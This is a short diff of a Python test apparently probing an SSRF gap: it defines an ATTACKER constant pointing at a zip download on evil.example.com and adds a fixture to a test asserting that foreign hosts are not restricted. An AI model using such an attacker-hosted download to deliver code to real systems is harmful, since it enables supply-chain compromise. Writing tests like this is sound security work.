@@ -38,7 +38,7 @@ ATTACKER = "https://evil.example.com/arena-agent-v4.164.0.zip"
 DIGEST = "a" * 64
 
 
-def test_the_premise_holds_ssrf_does_not_restrict_the_host():
+def test_the_premise_holds_ssrf_does_not_restrict_the_host(resolves_public_names):
     """This test is only meaningful if a foreign host is reachable.
 
     If SSRF validation is ever tightened to an allow-list, the bug below
